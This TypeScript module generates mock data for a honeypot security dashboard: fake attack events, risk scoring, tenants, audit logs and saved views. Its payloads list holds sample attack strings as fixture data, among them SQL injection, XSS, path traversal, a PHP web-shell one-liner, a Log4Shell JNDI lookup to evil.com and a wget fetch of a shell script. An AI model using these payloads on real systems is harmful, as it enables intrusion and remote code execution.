import { HoneypotEvent, Tenant, DashboardStats, TopItem, AuditLog, SavedView, RiskLevel, EventTag } from '@/types/honeypot';

const userAgents = [
  'Mozilla/5.0 (compatible; Nmap Scripting Engine)',
  'sqlmap/1.4.7#stable',
  'Nikto/2.1.6',
  'curl/7.68.0',
  'python-requests/2.25.1',
  'Go-http-client/1.1',
  'Nuclei - Open-source project',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  'Wget/1.21',
  'masscan/1.3',
];

const paths = [
  '/admin',
  '/wp-admin',
  '/phpmyadmin',
  '/.env',
  '/api/v1/users',
  '/login',
  '/wp-login.php',
  '/.git/config',
  '/admin/config.php',
  '/backup.sql',
  '/api/debug',
  '/actuator/health',
  '/solr/admin',
  '/manager/html',
];

const methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS'];

const payloads = [
  "' OR '1'='1",
  '<script>alert(1)</script>',
  '../../etc/passwd',
  '<?php system($_GET["cmd"]); ?>',
  'admin:admin',
  'root:toor',
  '{"username":"admin","password":"password123"}',
  'SELECT * FROM users',
  '${jndi:ldap://evil.com/a}',
  'wget http://malware.com/shell.sh',
];

const countries = ['CN', 'RU', 'US', 'BR', 'IN', 'VN', 'KR', 'DE', 'NL', 'UA'];

const tenants: Tenant[] = [
  { id: 't1', name: 'PT Secure Corp', created_at: '2024-01-15', retention_days: 30, is_active: true, token_count: 3 },
  { id: 't2', name: 'CV Digital Prima', created_at: '2024-02-20', retention_days: 90, is_active: true, token_count: 2 },
  { id: 't3', name: 'Startup Inovasi', created_at: '2024-03-10', retention_days: 7, is_active: true, token_count: 1 },
];

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomIP(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function calculateRiskScore(path: string, method: string, payload: string, userAgent: string): number {
  let score = 0;
  
  // Path sensitivity
  if (path.includes('admin') || path.includes('config') || path.includes('.env')) score += 30;
  if (path.includes('.git') || path.includes('backup')) score += 25;
  if (path.includes('phpmyadmin') || path.includes('wp-admin')) score += 20;
  
  // Payload analysis
  if (payload.includes('SELECT') || payload.includes("'")) score += 25;
  if (payload.includes('<script>') || payload.includes('<?php')) score += 30;
  if (payload.includes('jndi') || payload.includes('wget')) score += 35;
  if (payload.includes('passwd') || payload.includes('../')) score += 20;
  
  // User agent
  if (userAgent.includes('sqlmap') || userAgent.includes('Nikto')) score += 25;
  if (userAgent.includes('Nmap') || userAgent.includes('masscan')) score += 20;
  if (userAgent.includes('Nuclei')) score += 15;
  
  // Method
  if (method === 'POST' || method === 'PUT') score += 5;
  
  return Math.min(100, score);
}

function getRiskLevel(score: number): RiskLevel {
  if (score >= 80) return 'critical';
  if (score >= 60) return 'high';
  if (score >= 40) return 'medium';
  if (score >= 20) return 'low';
  return 'info';
}

function getTags(path: string, userAgent: string, payload: string): EventTag[] {
  const tags: EventTag[] = [];
  
  if (userAgent.includes('Nmap') || userAgent.includes('masscan') || userAgent.includes('Nikto')) {
    tags.push('scanner');
  }
  if (payload.includes('admin') && payload.includes('password')) {
    tags.push('bruteforce');
  }
  if (path.includes('actuator') || path.includes('health')) {
    tags.push('suspicious');
  }
  
  return tags;
}

export function generateMockEvent(index: number): HoneypotEvent {
  const tenant = randomChoice(tenants);
  const path = randomChoice(paths);
  const method = randomChoice(methods);
  const payload = randomChoice(payloads);
  const userAgent = randomChoice(userAgents);
  const riskScore = calculateRiskScore(path, method, payload, userAgent);
  
  const now = new Date();
  const timestamp = new Date(now.getTime() - Math.random() * 24 * 60 * 60 * 1000);
  
  return {
    id: `evt_${Date.now()}_${index}`,
    timestamp: timestamp.toISOString(),
    tenant_id: tenant.id,
    tenant_name: tenant.name,
    source_ip: randomIP(),
    country: randomChoice(countries),
    asn: `AS${Math.floor(Math.random() * 65000)}`,
    service: 'http-honeypot',
    path,
    method,
    user_agent: userAgent,
    payload_preview: payload.substring(0, 50) + (payload.length > 50 ? '...' : ''),
    payload_full: payload,
    headers: {
      'Host': 'honeypot.example.com',
      'Accept': '*/*',
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    risk_score: riskScore,
    risk_level: getRiskLevel(riskScore),
    tags: getTags(path, userAgent, payload),
    notes: undefined,
  };
}

export function generateMockEvents(count: number): HoneypotEvent[] {
  return Array.from({ length: count }, (_, i) => generateMockEvent(i));
}

export function getMockStats(): DashboardStats {
  return {
    total_events_today: Math.floor(Math.random() * 5000) + 1000,
    total_events_week: Math.floor(Math.random() * 25000) + 5000,
    unique_ips_today: Math.floor(Math.random() * 500) + 100,
    high_risk_events: Math.floor(Math.random() * 200) + 50,
    active_tenants: tenants.filter(t => t.is_active).length,
    events_per_hour: Array.from({ length: 24 }, () => Math.floor(Math.random() * 300) + 50),
  };
}

export function getMockTopIPs(): TopItem[] {
  return [
    { label: '192.168.1.100', count: 542, percentage: 25 },
    { label: '10.0.0.55', count: 389, percentage: 18 },
    { label: '172.16.0.12', count: 276, percentage: 13 },
    { label: '203.45.67.89', count: 198, percentage: 9 },
    { label: '45.33.32.156', count: 156, percentage: 7 },
  ];
}

export function getMockTopPaths(): TopItem[] {
  return [
    { label: '/wp-admin', count: 1245, percentage: 30 },
    { label: '/phpmyadmin', count: 892, percentage: 21 },
    { label: '/.env', count: 654, percentage: 16 },
    { label: '/admin', count: 445, percentage: 11 },
    { label: '/.git/config', count: 312, percentage: 8 },
  ];
}

export function getMockTenants(): Tenant[] {
  return tenants;
}

export function getMockAuditLogs(): AuditLog[] {
  return [
    { id: 'al1', timestamp: new Date().toISOString(), user_id: 'u1', user_email: 'admin@example.com', action: 'LOGIN_SUCCESS', details: 'Login berhasil dari IP 192.168.1.1', ip_address: '192.168.1.1' },
    { id: 'al2', timestamp: new Date(Date.now() - 3600000).toISOString(), user_id: 'u1', user_email: 'admin@example.com', action: 'TOKEN_CREATED', details: 'Token baru dibuat untuk tenant PT Secure Corp', ip_address: '192.168.1.1' },
    { id: 'al3', timestamp: new Date(Date.now() - 7200000).toISOString(), user_id: 'u2', user_email: 'viewer@example.com', action: 'EXPORT_DATA', details: 'Export CSV untuk 500 events', ip_address: '10.0.0.5' },
  ];
}

export function getMockSavedViews(): SavedView[] {
  return [
    { id: 'sv1', name: 'High Risk Only', filters: { risk_level: ['critical', 'high'] }, created_at: '2024-01-15' },
    { id: 'sv2', name: 'Scanner Detection', filters: { tags: ['scanner'] }, created_at: '2024-02-10' },
    { id: 'sv3', name: 'Admin Paths', filters: { path: '/admin' }, created_at: '2024-03-01' },
  ];
}
